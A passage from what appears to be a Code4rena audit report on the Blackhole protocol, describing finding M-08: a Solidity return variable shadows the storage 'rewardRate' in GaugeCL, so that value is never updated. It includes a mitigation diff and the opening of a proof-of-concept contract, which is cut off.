id=\"m-08-function-return-variable-shadowing-prevents-storage-updates-in-solidity\" style=\"position:relative;\"\u003e\u003ca href=\"#m-08-function-return-variable-shadowing-prevents-storage-updates-in-solidity\" aria-label=\"m 08 function return variable shadowing prevents storage updates in solidity permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-133\"\u003e[M-08] Function return variable shadowing prevents storage updates in solidity\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-324\"\u003ea39955720\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-480\"\u003eEkene\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L38\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L38\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L157-L183\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L157-L183\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L257-L259\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeCL.sol#L257-L259\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-6\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-6\" aria-label=\"finding description 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eGaugeCL::notifyRewardAmount\u003c/code\u003e function attempts to update the \u003ccode\u003erewardRate\u003c/code\u003e state variable, which is meant to track the reward emission rate for the current distribution period. However, the function declares a return variable named \u003ccode\u003erewardRate\u003c/code\u003e (as part of the function’s return signature), which \u003cstrong\u003eshadows\u003c/strong\u003e the contract-level storage variable. As a result, assignments within the function update only the local return variable, and the \u003cstrong\u003econtract’s storage \u003ccode\u003erewardRate\u003c/code\u003e is never updated\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eThis leads to the reward rate always remaining at its initial value (\u003ccode\u003e0\u003c/code\u003e), and any queries to \u003ccode\u003erewardForDuration()\u003c/code\u003e or other on-chain users referencing \u003ccode\u003erewardRate\u003c/code\u003e will receive inaccurate results.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// @audit-issue Storage rewardRate is shadowed and never updated\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enotifyRewardAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisNotEmergency\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyDistribution\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e{\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_periodFinish\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDURATION\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremaining\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_periodFinish\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eleftover\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremaining\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eleftover\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDURATION\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"issue-identified\" style=\"position:relative;\"\u003e\u003ca href=\"#issue-identified\" aria-label=\"issue identified permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eIssue identified\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThe function’s return signature declares a local variable \u003ccode\u003erewardRate\u003c/code\u003e, which \u003cstrong\u003eshadows\u003c/strong\u003e the contract’s storage variable of the same name.\u003c/li\u003e\n\u003cli\u003eAll assignments to \u003ccode\u003erewardRate\u003c/code\u003e within the function only affect this local variable, not the contract storage.\u003c/li\u003e\n\u003cli\u003eThe contract storage variable \u003ccode\u003erewardRate\u003c/code\u003e remains \u003cstrong\u003epermanently zero\u003c/strong\u003e, and is never updated by any function in the contract.\u003c/li\u003e\n\u003cli\u003eConsequently, the function \u003ccode\u003erewardForDuration()\u003c/code\u003e always returns \u003ccode\u003e0\u003c/code\u003e, misleading dApps, explorers, and UIs that rely on this state variable for reward calculations.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"risk-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#risk-and-impact\" aria-label=\"risk and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRisk and impact\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eLikelihood\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThis is a deterministic bug and will always occur if the function signature is not fixed.\u003c/li\u003e\n\u003cli\u003eAny user or protocol that queries \u003ccode\u003erewardForDuration()\u003c/code\u003e or the public \u003ccode\u003erewardRate\u003c/code\u003e will receive incorrect values.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImpact\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eProtocol dashboards, explorers, or analytic scripts may display incorrect or misleading reward information.\u003c/li\u003e\n\u003cli\u003eThird-party tools or automated scripts that rely on on-chain \u003ccode\u003erewardRate\u003c/code\u003e data could behave incorrectly.\u003c/li\u003e\n\u003cli\u003eDoes \u003cstrong\u003enot\u003c/strong\u003e directly cause loss of funds or user assets, but can lead to confusion or improper reward tracking.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRename the function return variable to avoid shadowing, or directly assign to the storage variable inside the function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"38\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction notifyRewardAmount(address token, uint256 reward)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    external\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    nonReentrant\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    isNotEmergency\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    onlyDistribution\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-   returns (IncentiveKey memory incentivekey, uint256 rewardRate, uint128 bonusRewardRate)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   returns (IncentiveKey memory, uint256, uint128)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e{\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    require(token == address(rewardToken), \u0026quot;not rew token\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    if (block.timestamp \u0026gt;= _periodFinish) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        rewardRate = reward / DURATION;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    } else {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 remaining = _periodFinish - block.timestamp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 leftover = remaining * rewardRate;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        rewardRate = (reward + leftover) / DURATION;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    _periodFinish = block.timestamp + DURATION;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    (IERC20Minimal rewardTokenAdd, IERC20Minimal bonusRewardTokenAdd, IAlgebraPool pool, uint256 nonce) =\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        algebraEternalFarming.incentiveKeys(poolAddress);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-   incentivekey = IncentiveKey(rewardTokenAdd, bonusRewardTokenAdd, pool, nonce);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   IncentiveKey memory incentivekey = IncentiveKey(rewardTokenAdd, bonusRewardTokenAdd, pool, nonce);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    bytes32 incentiveId = IncentiveId.compute(incentivekey);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    (,, address virtualPoolAddress,,,) = algebraEternalFarming.incentives(incentiveId);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-   (,bonusRewardRate) = IAlgebraEternalVirtualPool(virtualPoolAddress).rewardRates();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   (,uint128 bonusRewardRate) = IAlgebraEternalVirtualPool(virtualPoolAddress).rewardRates();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    rewardToken.safeTransferFrom(DISTRIBUTION, address(this), reward);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    IERC20(token).safeApprove(farmingParam.algebraEternalFarming, reward);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    algebraEternalFarming.addRewards(incentivekey, uint128(reward), 0);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    emit RewardAdded(reward);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   return(incentivekey, rewardRate, bonusRewardRate);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-5\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// SPDX-License-Identifier: MIT\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e27\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eShadowedStorageExample\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eincrementRewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e 